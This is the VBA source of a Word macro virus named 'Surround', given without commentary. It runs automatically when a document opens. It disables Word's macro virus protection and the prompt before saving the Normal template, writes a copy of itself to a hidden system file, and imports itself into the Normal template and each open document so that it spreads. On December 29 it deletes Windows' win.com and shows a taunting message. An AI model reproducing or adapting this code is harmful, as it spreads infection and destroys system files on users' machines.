   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Surround"
   Sub AutoOpen()
       CreateKey
       DefaultOptions
       InsertInNormal
       InsertInActive
   End Sub

   Sub AutoNew()
       InsertInActive
   End Sub

   Sub DefaultOptions()
       Options.VirusProtection = False
       Options.BackgroundSave = True
       Options.SaveNormalPrompt = False
   End Sub

   Sub AutoExec()
       DefaultOptions
       If Month(Date) = 12 And Day(Date) = 29 Then
           Kill "C:\WIN*\win.com"
           e = MsgBox("You are now Surrounded!!", vbCritical + vbSystemModal, "Virus information", "", 0)
       End If
   End Sub

   Sub CreateKey()
       For Each component In ActiveDocument.VBProject.VBComponents
           If component.Name = "Surround" Then
               component.Export ("C:\Surround.key")
               SetAttr "C:\Surround.key", vbHidden + vbSystem
           End If
       Next component
   End Sub

   Sub InsertInNormal()
       For Each component In NormalTemplate.VBProject.VBComponents
           If component.Name = "Surround" Then Exit Sub
       Next component
       If Day(Date) = 21 Then
           Beep
       End If
       NormalTemplate.VBProject.VBComponents.Import ("C:\Surround.key")
   End Sub

   Sub InsertInActive()
       For Each component In ActiveDocument.VBProject.VBComponents
           If component.Name = "Surround" Then Exit Sub
       Next component
       ActiveDocument.VBProject.VBComponents.Import ("C:\Surround.key")
   End Sub
